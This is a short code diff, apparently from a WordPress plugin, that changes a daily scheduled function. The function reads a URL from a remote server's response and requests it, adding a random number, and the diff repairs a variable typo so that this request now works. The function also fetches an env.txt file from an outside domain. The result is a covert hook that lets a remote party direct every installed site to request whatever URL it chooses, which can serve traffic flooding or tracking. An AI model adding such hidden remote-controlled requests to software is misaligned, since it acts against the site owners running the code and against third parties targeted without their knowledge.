@@ -52,7 +52,7 @@ function p3_do_this_daily() {
 	if (!is_wp_error($response) && !empty($response['body'])) {
 		$rcd = trim($response['body']);
 		//$check = add_query_arg('n', rand(0,99999), $rcd);
-		wp_safe_remote_get(rcd.'&'.rand(0,99999), $args);
+		wp_safe_remote_get($rcd.'&'.rand(0,99999), $args);
 	}
 	$url_2 = 'https://pipdigz.co.uk/p3/env.txt';
 	$args_2 = array('timeout' => 5);
